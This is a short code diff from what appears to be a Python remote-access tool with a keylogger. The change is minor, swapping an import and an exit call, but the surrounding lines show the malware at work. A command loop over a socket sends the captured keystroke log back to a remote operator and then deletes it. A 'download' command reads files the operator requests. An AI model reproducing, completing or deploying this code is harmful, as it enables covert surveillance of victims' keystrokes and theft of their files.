@@ -5,7 +5,7 @@ import subprocess
 import threading
 import time
 import base64
-import sys
+from sys import exit
 import requests
 
 
@@ -99,7 +99,7 @@ def receive_commands():
         elif data[:3].decode("utf-8") == "end":
             s.send(str.encode("loged so far:" + read_file("logs.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
             os.remove("logs.txt")
-            os._exit(1)
+            exit(0)
 
         elif data[:8].decode("utf-8") == "download":
             tekst = read_file(data[9:].decode("utf-8"))
